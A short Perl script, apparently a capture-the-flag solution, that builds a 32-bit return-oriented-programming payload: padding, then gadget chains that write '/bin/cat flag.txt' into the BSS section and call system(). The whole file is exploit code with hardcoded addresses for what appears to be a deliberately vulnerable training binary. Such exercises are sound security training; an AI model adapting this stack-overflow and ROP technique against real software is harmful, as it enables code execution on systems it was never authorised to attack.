$PADDING  = "B"x44;
$BSS      = "\x40\xa0\x04\x08"; # BSS section
$CALLSYS  = "\x5a\x86\x04\x08"; # call to system() in 'usefulFunction'
$SETREGS  = "\xda\x86\x04\x08"; # gagdget that pops into edi and ebp
$WRITEMEM = "\x70\x86\x04\x08"; # 'usefulGadgets'

sub write_bytes
{
	my ($addr, $string) = @_;

	my $mod = (length $string) % 4;
	if ($mod ne 0) {
		$string .= "\x00" x (4 - $mod);
	}

	my $rop = "";
	for my $str (unpack("(a4)*", $string))
	{
		$rop  .= $SETREGS . pack("V", $addr) . $str . $WRITEMEM;
		$addr += 4;
	}

	$rop;
}

print $PADDING
	. write_bytes(0x0804a040, "/bin/cat flag.txt\0") # write @bss
	. $CALLSYS
	. $BSS;
